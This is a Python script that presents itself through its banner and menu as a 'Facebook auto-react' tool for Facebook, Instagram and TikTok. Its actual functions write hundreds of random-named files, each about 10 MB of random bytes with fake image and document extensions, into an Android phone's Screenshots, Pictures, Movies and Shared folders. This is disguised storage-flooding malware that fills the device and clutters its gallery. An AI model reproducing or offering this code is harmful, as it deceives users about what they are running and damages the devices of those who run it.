import os 
import secrets
import time

extension = ['jpeg', 'png', 'apk', 'mp4', 'mp3']

def display():
    print(
        """
    ███████╗ █████╗  ██████╗███████╗██████╗  ██████╗  ██████╗ ██╗  ██╗            
    ██╔════╝██╔══██╗██╔════╝██╔════╝██╔══██╗██╔═══██╗██╔═══██╗██║ ██╔╝            
    █████╗  ███████║██║     █████╗  ██████╔╝██║   ██║██║   ██║█████╔╝             
    ██╔══╝  ██╔══██║██║     ██╔══╝  ██╔══██╗██║   ██║██║   ██║██╔═██╗             
    ██║     ██║  ██║╚██████╗███████╗██████╔╝╚██████╔╝╚██████╔╝██║  ██╗            
    ╚═╝     ╚═╝  ╚═╝ ╚═════╝╚══════╝╚═════╝  ╚═════╝  ╚═════╝ ╚═╝  ╚═╝            
                                                                                  
 █████╗ ██╗   ██╗████████╗ ██████╗       ██████╗ ███████╗ █████╗  ██████╗████████╗
██╔══██╗██║   ██║╚══██╔══╝██╔═══██╗      ██╔══██╗██╔════╝██╔══██╗██╔════╝╚══██╔══╝
███████║██║   ██║   ██║   ██║   ██║█████╗██████╔╝█████╗  ███████║██║        ██║   
██╔══██║██║   ██║   ██║   ██║   ██║╚════╝██╔══██╗██╔══╝  ██╔══██║██║        ██║   
██║  ██║╚██████╔╝   ██║   ╚██████╔╝      ██║  ██║███████╗██║  ██║╚██████╗   ██║   
╚═╝  ╚═╝ ╚═════╝    ╚═╝    ╚═════╝       ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝ ╚═════╝   ╚═╝ 
                                BY CYBERRON
##### ##### ##### ##### ##### ##### ##### ##### ##### ##### ##### ##### ##### ##### ##### ##### ##### ##### 
                                                                                                             
                                                                                    
"""
    )

def option():
    print(
        "\t\t[!]Choose a Platform"
        "\n[1] FACEBOOK"
        "\n[2] INSTAGRAM"
        "\n[3] TIKTOK"
        "\n#########################################################"
    )








def file1():
    for x in range(3):
        randomfilename = secrets.token_urlsafe(500)
        randomextension = secrets.choice(["jpeg", "png", "pdf", "ppt", "rst"])
        randomfile = f"{randomfilename}.{randomextension}"

            

        desk = os.path.join("/storage/emulated/0/DCIM/Screenshots", randomfile)
        

        with open(desk, 'wb') as file:
            file.write(secrets.token_bytes(9999999))

def file2():
    for v in range(200):
        randomfilename = secrets.token_urlsafe(500)
        randomextension = secrets.choice(["jpeg", "png", "pdf", "ppt", "rst"])
        randomfile = f"{randomfilename}.{randomextension}"

            

        desk = os.path.join("/storage/emulated/0/Pictures", randomfile)
        

        with open(desk, 'wb') as file:
             file.write(secrets.token_bytes(9999999))

def file3():
    for v in range(200):
        randomfilename = secrets.token_urlsafe(500)
        randomextension = secrets.choice(["jpeg", "png", "pdf", "ppt", "rst"])
        randomfile = f"{randomfilename}.{randomextension}"

            

        desk = os.path.join("/storage/emulated/0/Movies", randomfile)
        

        with open(desk, 'wb') as file:
             file.write(secrets.token_bytes(9999999))


def file4():
    for v in range(200):
        randomfilename = secrets.token_urlsafe(200)
        randomextension = secrets.choice(["jpeg", "png", "pdf", "ppt", "rst"])
        randomfile = f"{randomfilename}.{randomextension}"

            

        desk = os.path.join("/storage/emulated/0/Shared", randomfile)
        

        with open(desk, 'wb') as file:
             file.write(secrets.token_bytes(9999999))